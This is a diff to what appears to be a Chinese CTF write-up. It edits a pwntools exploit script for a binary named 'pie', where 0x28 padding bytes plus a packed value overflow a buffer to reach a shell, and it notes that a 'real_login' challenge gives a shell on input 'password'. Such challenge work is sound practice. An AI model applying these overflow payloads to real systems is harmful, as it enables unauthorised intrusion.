@@ -92,7 +92,7 @@ if local:
 
 p = process("./pie")
 
-# pwnlib.gdb.attach(p, 'b *main')
+pwnlib.gdb.attach(p, 'b puts')
 
 else:
 
@@ -100,16 +100,17 @@ pass
 
   
 
-pwnlib.gdb,attach(p)
+# pwnlib.gdb,attach(p)
 
-payload = b'a' * 0x28 + b'd'
+payload = b'a' * 0x28 + p64(0x6c)
 
-p.sendline(payload)
+p.send(payload)
 
 p.interactive()
 ```
 shell:
-![[Pasted image 20250115100413.png]]
+![[Pasted image 20250116161208.png]]
+
 # real_login
 ![[Pasted image 20250115100541.png]]
 当输入为password时获取shell
